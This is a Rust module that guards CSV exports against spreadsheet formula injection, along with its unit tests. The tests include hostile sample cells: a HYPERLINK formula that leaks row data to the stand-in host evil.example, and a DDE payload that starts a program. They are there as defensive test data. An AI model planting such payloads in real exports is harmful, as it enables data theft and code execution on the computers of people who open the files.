//! Text that will be opened in a spreadsheet program.
//!
//! A CSV file has no cell types: Excel, LibreOffice and Google Sheets read any cell that
//! starts with `=`, `+`, `-` or `@` (or a tab or carriage return before one) as a formula.
//! A student's name, an address or a note typed or imported into Madrasa could therefore run
//! a formula on the PC of whoever opens an exported list ("CSV injection"): fetch a web
//! address with the row's data in it, or start a program through DDE. Workbooks (`.xlsx`)
//! are not affected: Madrasa writes text cells as text there.

use std::borrow::Cow;

/// A cell value made safe for CSV: text that a spreadsheet would read as a formula gets an
/// apostrophe in front (the spreadsheet then shows it as the text it is). Plain numbers,
/// including negative amounts and phone numbers written `+92…`, are left alone.
pub fn csv_cell(value: &str) -> Cow<'_, str> {
    let first = value.chars().next();
    let risky = matches!(first, Some('=' | '+' | '-' | '@' | '\t' | '\r'));
    if !risky || is_plain_number(value) {
        return Cow::Borrowed(value);
    }
    Cow::Owned(format!("'{value}"))
}

/// Digits with an optional sign, one decimal point and thousands separators: nothing a
/// spreadsheet could run.
fn is_plain_number(value: &str) -> bool {
    let rest = value.strip_prefix(['+', '-']).unwrap_or(value);
    !rest.is_empty()
        && rest.chars().any(|c| c.is_ascii_digit())
        && rest
            .chars()
            .all(|c| c.is_ascii_digit() || matches!(c, '.' | ',' | ' '))
        && rest.matches('.').count() <= 1
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn formulas_are_made_text_and_numbers_are_left_alone() {
        for hostile in [
            "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")",
            "=cmd|' /C calc'!A0",
            "+SUM(1,2)",
            "-2+3",
            "@SUM(A1:A9)",
            "\t=1+1",
            "\r=1+1",
            "=",
            "-",
            "+92 300 x",
        ] {
            let safe = csv_cell(hostile);
            assert!(safe.starts_with('\''), "{hostile:?} -> {safe:?}");
            assert_eq!(&safe[1..], hostile);
        }
        for plain in [
            "Ali Khan",
            "-250.00",
            "-1,250.00",
            "+923001234567",
            "+92 300 1234567",
            "42",
            "",
            "A = B",
            "user@example.org",
            "2026-04-01",
            "KHI-MC-2026-00001",
        ] {
            assert_eq!(csv_cell(plain), plain, "{plain:?}");
        }
    }
}
